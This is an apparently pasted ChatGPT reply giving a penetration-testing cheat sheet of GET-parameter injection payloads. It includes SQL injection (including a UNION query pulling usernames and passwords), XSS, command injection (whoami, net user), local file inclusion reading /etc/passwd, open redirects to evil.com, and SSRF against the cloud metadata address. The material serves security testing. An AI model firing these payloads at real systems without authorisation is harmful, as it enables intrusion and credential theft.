@@ -1,0 +1,130 @@
+injection attaks on get parameter with exact paylods ?
+
+
+ChatGPT said:
+Absolutely! Here's a breakdown of injection attacks on GET parameters, along with exact payloads you can use for testing during VAPT. These are applicable to web interfaces inside a thick client app or Citrix-based environments where the app makes HTTP requests via GET.
+
+🚨 What Are GET Parameters?
+GET parameters are values passed in the URL query string, like:
+
+bash
+Copy
+Edit
+http://example.com/search.php?q=test
+In VAPT, we manipulate values like q=test to see how the app behaves — looking for SQLi, XSS, Command Injection, etc.
+
+💉 1. SQL Injection (SQLi)
+🔍 Target:
+http
+Copy
+Edit
+http://example.com/item.php?id=1
+🧪 Test Payloads:
+➤ Basic SQLi
+bash
+Copy
+Edit
+?id=1'
+?id=1 OR 1=1--
+?id=1 AND 1=2--
+?id=1'; WAITFOR DELAY '0:0:5'--
+➤ Boolean-Based
+bash
+Copy
+Edit
+?id=1 AND 1=1
+?id=1 AND 1=2
+➤ UNION Injection
+pgsql
+Copy
+Edit
+?id=1 UNION SELECT NULL, NULL--
+?id=1 UNION SELECT 1, username, password FROM users--
+🧼 2. Cross-Site Scripting (XSS)
+🔍 Target:
+http
+Copy
+Edit
+http://example.com/profile.php?name=John
+🧪 Payloads:
+➤ Reflected XSS
+php-template
+Copy
+Edit
+?name=<script>alert('XSS')</script>
+?name="><img src=x onerror=alert(1)>
+➤ HTML Injection
+javascript
+Copy
+Edit
+?name=<h1>Hacked</h1>
+?name=<svg onload=alert(1)>
+🧨 3. Command Injection
+🔍 Target:
+http
+Copy
+Edit
+http://example.com/ping.php?host=127.0.0.1
+🧪 Payloads:
+➤ Basic
+ruby
+Copy
+Edit
+?host=127.0.0.1; whoami
+?host=127.0.0.1 && net user
+➤ Encoded
+perl
+Copy
+Edit
+?host=127.0.0.1%26%26whoami
+?host=127.0.0.1|id
+🧬 4. Local File Inclusion (LFI)
+🔍 Target:
+http
+Copy
+Edit
+http://example.com/page.php?file=home
+🧪 Payloads:
+bash
+Copy
+Edit
+?file=../../../../etc/passwd
+?file=../../../../windows/win.ini
+?file=php://filter/convert.base64-encode/resource=index.php
+🔐 5. Open Redirect
+🔍 Target:
+http
+Copy
+Edit
+http://example.com/redirect.php?url=https://safe.com
+🧪 Payloads:
+perl
+Copy
+Edit
+?url=http://evil.com
+?url=//evil.com
+?url=https://evil.com@safe.com
+📡 6. SSRF (Server-Side Request Forgery)
+🔍 Target:
+http
+Copy
+Edit
+http://example.com/fetch.php?url=http://site.com
+🧪 Payloads:
+cpp
+Copy
+Edit
+?url=http://127.0.0.1:80
+?url=http://169.254.169.254/latest/meta-data/
+🛠 Pro Tips:
+URL Encode your payloads when needed.
+
+Use tools like:
+
+Burp Suite Intruder
+
+ffuf or wfuzz
+
+sqlmap for automated SQLi testing
+
+Always inspect response times, HTTP codes, and reflected inputs
